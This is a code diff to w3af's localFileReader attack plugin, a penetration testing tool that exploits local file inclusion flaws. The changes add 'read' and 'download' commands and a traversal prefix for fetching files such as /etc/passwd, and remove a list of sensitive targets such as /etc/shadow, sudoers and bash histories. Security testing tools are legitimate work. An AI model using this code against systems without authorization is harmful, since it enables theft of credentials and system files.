@@ -26,17 +26,17 @@ import core.controllers.outputManager as om
 from core.data.options.option import option
 from core.data.options.optionList import optionList
 from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
+from core.controllers.misc.levenshtein import relative_distance_ge
 
 import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
-from core.data.constants.common_directories import get_common_directories
-from core.data.kb.shell import shell as shell
+from core.data.kb.read_shell import read_shell as read_shell
 
 from core.controllers.w3afException import w3afException
 import core.data.parsers.urlParser as urlParser
-from core.data.fuzzer.fuzzer import createRandAlNum
 
-import re
+
+from plugins.attack.payloads.decorators.read_decorator import read_debug
 
 
 class localFileReader(baseAttackPlugin):
@@ -67,6 +67,7 @@ class localFileReader(baseAttackPlugin):
             om.out.error('You have to configure the "url" parameter.')
         else:
             v = vuln.vuln()
+            v.setPluginName(self.getName())
             v.setURL( self._url )
             v.setMethod( self._method )
             v.setDc( self._data )
@@ -113,7 +114,7 @@ class localFileReader(baseAttackPlugin):
             # Create the shell object
             shell_obj = fileReaderShell( vuln_obj )
             shell_obj.setUrlOpener( self._urlOpener )
-            shell_obj.setCut( self._header, self._footer )
+            shell_obj.set_cut( self._header_length, self._footer_length )
             
             return shell_obj
             
@@ -122,18 +123,30 @@ class localFileReader(baseAttackPlugin):
 
     def _verifyVuln( self, vuln_obj ):
         '''
-        This command verifies a vuln. This is really hard work!
+        This command verifies a vuln.
 
         @return : True if vuln can be exploited.
         '''
         function_reference = getattr( self._urlOpener , vuln_obj.getMethod() )
+        
+        #    Prepare the first request, with the original data
+        data_a = str(vuln_obj.getDc())
+        
+        #    Prepare the second request, with a non existent file
+        vulnerable_parameter = vuln_obj.getVar()
+        vulnerable_dc = vuln_obj.getDc()
+        vulnerable_dc_copy = vulnerable_dc.copy()
+        vulnerable_dc_copy[ vulnerable_parameter ] = '/do/not/exist'
+        data_b = str(vulnerable_dc_copy) 
+        
         try:
-            response = function_reference( vuln_obj.getURL(), str(vuln_obj.getDc()) )
+            response_a = function_reference( vuln_obj.getURL(), data_a )
+            response_b = function_reference( vuln_obj.getURL(), data_b )
         except w3afException, e:
             om.out.error( str(e) )
             return False
         else:
-            if self._defineCut( response.getBody(), vuln_obj['file_pattern'], exact=False ):
+            if self._guess_cut( response_a.getBody(), response_b.getBody(), vuln_obj['file_pattern'] ):
                 return True
             else:
                 return False
@@ -228,12 +241,14 @@ NO_SUCH_FILE =  'No such file or directory.'
 READ_DIRECTORY = 'Cannot cat a directory.'
 FAILED_STREAM = 'Failed to open stream.'
 
-class fileReaderShell(shell):
+class fileReaderShell(read_shell):
     '''
     A shell object to exploit local file include and local file read vulns.
 
     @author: Andres Riancho ( andres.riancho@gmail.com )
     '''
+    _detected_file_not_found = False
+    _application_file_not_found_error = None
 
     def help( self, command ):
         '''
@@ -243,63 +258,60 @@ class fileReaderShell(shell):
             om.out.console('')
             om.out.console('Available commands:')
             om.out.console('    help                            Display this information')
-            om.out.console('    cat                             Show the contents of a file')
+            om.out.console('    read                            Echoes the contents of a file.')
+            om.out.console('    download                        Downloads a file to the local filesystem.')
             om.out.console('    list                            List files that may be interesting.')
             om.out.console('                                    Type "help list" for detailed information.')
-            om.out.console('    endInteraction                  Exit the shell session')
+            om.out.console('    exit                            Exit the shell session')
             om.out.console('')
-        elif command == 'list':
-            om.out.console('')
-            om.out.console('list help:')
-            om.out.console('    The list command generates a list of the files that are available')
-            om.out.console('    on the remote server. If you specify the "-r" flag, the list ')
-            om.out.console('    process is recursive, this means that if one of the files in the')
-            om.out.console('    list references another file, that file is also added to the list')
-            om.out.console('    of available files. The "-r" flag expects an integer, which ')
-            om.out.console('    indicates the recursion level.')
-            om.out.console('')
-            om.out.console('Examples:')
-            om.out.console('    list -r 10')
-            om.out.console('    list')
-        elif command == 'cat':
-            om.out.console('cat help:')
-            om.out.console('    The cat command echoes the content of a file to the console. The')
+        elif command == 'read':
+            om.out.console('read help:')
+            om.out.console('    The read command echoes the content of a file to the console. The')
             om.out.console('    command takes only one parameter: the full path of the file to ')
             om.out.console('    read.')
             om.out.console('')
             om.out.console('Examples:')
-            om.out.console('    cat /etc/passwd')
+            om.out.console('    read /etc/passwd')
+        elif command == 'download':
+            om.out.console('download help:')
+            om.out.console('    The download command reads a file in the remote system and saves')
+            om.out.console('    it to the local filesystem.')
+            om.out.console('')
+            om.out.console('Examples:')
+            om.out.console('    download /etc/passwd /tmp/passwd')
         return True
         
-    def _rexec( self, command ):
+    def _init_read(self):
         '''
-        This method is called when a command is being sent to the remote server.
-        This is a NON-interactive shell. In this case, the only available command is "cat"
-
-        @parameter command: The command to send ( cat is the only supported command. ).
-        @return: The result of the command.
-        '''
-
-        # Get the command and the parameters
-        cmd = command.split(' ')[0]
-        parameters = command.split(' ')[1:]
-
-        # Select the correct handler
-        if cmd == 'list':
-            return self._list( parameters )
-        elif cmd == 'cat' and len(parameters) == 1:
-            filename = parameters[0]
-            return self._cat( filename )
-        else:
-            self.help( command )
-            return ''
+        This method requires a non existing file, in order to save the error message and prevent it
+        to leak as the content of a file to the uper layers.
+        
+        Example:
+            - Application behaviour:
+                1- (request) http://host.tld/read.php?file=/etc/passwd
+                1- (response) "root:x:0:0:root:/root:/bin/bash..."
+                
+                2- (request) http://host.tld/read.php?file=/tmp/do_not_exist
+                2- (response) "...The file doesn't exist, please try again...'"
+                
+            - Before implementing this check, the read method returned "The file doesn't exist, please try again"
+            as if it was the content of the "/tmp/do_not_exist" file.
             
-    def _cat( self, filename ):
+            - Now, we handle that case and return an empty string.
+        '''
+        self._application_file_not_found_error = self.read('not_exist0.txt')
+    
+    @read_debug
+    def read( self, filename ):
         '''
         Read a file and echo it's content.
 
         @return: The file content.
         '''
+        if not self._detected_file_not_found:
+            self._detected_file_not_found = True
+            self._init_read()
+            
         # TODO: Review this hack
         filename = '../' * 15 + filename
 
@@ -312,222 +324,55 @@ class fileReaderShell(shell):
         except w3afException, e:
             return 'Error "' + str(e) + '" while sending command to remote host. Try again.'
         else:
-            return self._filter_errors( self._cut( response.getBody() ) )
-                
-    def _list( self, parameters ):
-        '''
-        Using some path disclosure problems I can make a good guess
-        of the full paths of all files in the webroot, this is the result of
-        that guess
-        
-        @parameter parameters: Indicates if we have to do a recursive list or not.
-        '''
-        # Parse the parameters
-        recursion_level = 0
-        if len(parameters) == 2:
-            if parameters[0] == '-r' and parameters[1].isdigit():
-                recursion_level = int(parameters[1])
-            else:
-                self.help('list')
-                return ''
-        
-        # Add some files that were generated by the pathDisclosure plugin
-        files_to_test = kb.kb.getData( 'pathDisclosure' , 'listFiles' )
-        # A lot of common files from a database
-        files_to_test.extend( self._get_common_files( self._rOS ) )
+            #print '=' * 40 + ' Sb ' + '=' * 40
+            #print response.getBody()
+            #print '=' * 40 + ' Eb ' + '=' * 40
 
-        # First, we try with a non existant file, in order to have something to compare with
-        rand = createRandAlNum(8)
-        non_existant = self._cat( rand )
-        non_existant = non_existant.replace( rand, '')
-        
-        # Define this internal variable that's going to be used in the self._list_recursive_method()
-        self._already_tested = []
-        
-        can_read, permission_denied = self._list_recursive_method( non_existant, files_to_test, recursion_level )
-        tmp = can_read
-        tmp.extend( permission_denied )
-        return '\n'.join(tmp)
-
-    def _list_recursive_method(self, non_existant, files_to_test, recursion_level):
-        '''
-        This is a method that is called recursively in order to handle the
-        "-r" flag of the list command.
-        
-        @parameter non_existant: A string that represents the response for a non existant file
-        @parameter files_to_test: A list with the files to test for existance
-        @parameter recursion_level: The recursion level, this number is decremented in each call.
-        
-        @return: A tuple with two lists, one for the files we can read without any problem, and one
-        for the files that exist, but we don't have permission to read. Example:
-                (['/etc/passwd'],['/etc/shadow'])
-        '''
-        can_read = []
-        permission_denied = []
-
-        for path_file in files_to_test:
+            cutted_response = self._cut( response.getBody() )
+            filtered_response = self._filter_errors( cutted_response, filename )
             
-            # Make this check to avoid double GET's
-            if path_file not in self._already_tested:
-                self._already_tested.append(path_file)
+            #print '=' * 40 + ' Sc ' + '=' * 40
+            #print filtered_response
+            #print '=' * 40 + ' Ec ' + '=' * 40
+            
+            return filtered_response
                 
-                read_result = self._cat( path_file )
-                read_result = read_result.replace( path_file, '')
-                
-                filtered_result = self._filter_errors( read_result )
-                
-                if filtered_result == PERMISSION_DENIED:
-                    spaces = 40 - len(path_file)
-                    permission_denied.append(path_file + ' ' * spaces + PERMISSION_DENIED)
-                elif filtered_result not in [NO_SUCH_FILE, READ_DIRECTORY, FAILED_STREAM] and \
-                read_result != non_existant:
-                    # The file exists, add it to the response
-                    can_read.append(path_file)
-                    
-                    # Get the files referenced by this file
-                    referenced_files = self._get_referenced_files( path_file, filtered_result )
-                    referenced_files = list( set(referenced_files) - set(self._already_tested) )
-                    
-                    # Recursive stuff =)
-                    if recursion_level and referenced_files:
-                        tmp_read, tmp_denied = self._list_recursive_method( non_existant, referenced_files, recursion_level - 1 )
-                        can_read.extend( tmp_read )
-                        permission_denied.extend( tmp_denied )
-                        
-                        # uniq
-                        can_read = list(set(can_read))
-                        permission_denied = list(set(permission_denied))
-                    
-        can_read.sort()
-        permission_denied.sort()
-        return can_read, permission_denied
-
-    def _get_referenced_files(self, path_file, file_content):
-        '''
-        @parameter path_file: The path and filename for the file that we are analyzing
-        @parameter file_content: The content of the file that we just read.
-        
-        @return: A list of files that are referenced from the file.
-        '''
-        # Compile
-        regular_expressions = []
-        for common_dirs in get_common_directories():
-            regex_string = '('+common_dirs + '.*?)[:| |\0|\'|"|<|\n|\r|\t]'
-            regex = re.compile( regex_string,  re.IGNORECASE)
-            regular_expressions.append(regex)
-        
-        # And use
-        result = []
-        for regex in regular_expressions:
-            result.extend( regex.findall( file_content ) )
-        
-        # uniq
-        result = list(set(result))
-        
-        return result
-
-    def _get_common_files(self, remote_os):
-        '''
-        @return: A list of common files for the remote_os system.
-        '''
-        # TODO: maybe this should be on a different file, where all the framework
-        # can access it?
-        res = []
-
-        if remote_os == 'linux':
-            # Common files
-            res.append('/etc/passwd')
-            res.append('/etc/inetd.conf')
-            res.append('/etc/xinetd.conf')
-            res.append('/etc/shadow')
-
-            # Different apache configs and scripts
-            res.append('/etc/init.d/apache2')
-            res.append('/etc/init.d/apache')
-            res.append('/etc/apache2/httpd.conf')
-            res.append('/etc/httpd/httpd.conf')
-            res.append('/etc/apache/apache.conf')
-            res.append('/etc/apache/httpd.conf')
-            res.append('/etc/apache2/apache2.conf')
-            res.append('/usr/local/apache2/conf/httpd.conf')
-            res.append('/usr/local/apache/conf/httpd.conf')
-            res.append('/opt/apache/conf/httpd.conf')
-            res.append('/home/apache/httpd.conf')
-            res.append('/home/apache/conf/httpd.conf')
-            res.append('/etc/apache2/sites-available/default')
-            res.append('/etc/apache2/vhosts.d/default_vhost.include')
-            res.append('/etc/httpd/conf/httpd.conf')
-            res.append('/opt/jboss4/server/default/conf/users.properties')
-
-            # Services and stuff
-            res.append('/etc/crontab')
-            res.append('/etc/sudoers')
-            res.append('/etc/bash.bashrc')
-            res.append('/etc/fstab')
-            res.append('/etc/motd')
-            res.append('/etc/environment')
-            res.append('/etc/hosts.allow')
-            res.append('/etc/hosts.deny')
-            res.append('/etc/hosts')
-
-            # bash history files
-            res.append('/root/.bash_history')
-            res.append('/var/www/.bash_history')
-            res.append('/home/www/.bash_history')
-            res.append('/home/apache/.bash_history')
-            res.append('/home/nobody/.bash_history')
-            res.append('/.bash_history')
-            res.append('/tmp/.bash_history')
-
-        # TODO: Complete this list with windows stuff
-        return res
-
-    def _filter_errors( self, result ):
+    def _filter_errors( self, result,  filename ):
         '''
         Filter out ugly php errors and print a simple "Permission denied" or "File not found"
         '''
+        filtered = ''
+        
         if result.count('<b>Warning</b>'):
             if result.count( 'Permission denied' ):
-                result = PERMISSION_DENIED
+                filtered = PERMISSION_DENIED
             elif result.count( 'No such file or directory in' ):
-                result = NO_SUCH_FILE
+                filtered = NO_SUCH_FILE
             elif result.count( 'Not a directory in' ):
-                result = READ_DIRECTORY
+                filtered = READ_DIRECTORY
             elif result.count('</a>]: failed to open stream:'):
-                result = FAILED_STREAM
+                filtered = FAILED_STREAM
+                
+        elif self._application_file_not_found_error is not None:
+            #   The application file not found error string that I have has the "not_exist0.txt"
+            #   string in it, so I'm going to remove that string from it.
+            app_error = self._application_file_not_found_error.replace("not_exist0.txt",  '')
+            
+            #   The result string has the file I requested inside, so I'm going to remove it.
+            trimmed_result = result.replace( filename,  '')
+            
+            #   Now I compare both strings, if they are VERY similar, then filename is a non 
+            #   existing file.
+            if relative_distance_ge(app_error, trimmed_result, 0.9):
+                filtered = NO_SUCH_FILE
+
+        #
+        #   I want this function to return an empty string on errors. Not the error itself.
+        #
+        if filtered != '':
+            return ''
+        
         return result
-    
-    def end( self ):
-        '''
-        Cleanup. In this case, do nothing.
-        '''
-        om.out.debug('fileReaderShell cleanup complete.')
-        
-    def _identifyOs( self ):
-        '''
-        Identify the remote operating system and get some remote variables to show to the user.
-        '''
-        res = self._cat('/etc/passwd')
-        if 'root:' in res:
-            self._rOS = 'linux'
-        else:
-            self._rOS = 'windows'
-
-        # This can't be determined
-        self._rSystem = ''
-        self._rSystemName = 'linux'
-        self._rUser = 'file-reader'
-    
-    def __repr__( self ):
-        '''
-        @return: A string representation of this shell.
-        '''
-        if not self._rOS:
-            self._identifyOs()
-
-        return '<shell object (rsystem: "'+self._rOS+'")>'
-        
-    __str__ = __repr__
     
     def getName( self ):
         '''
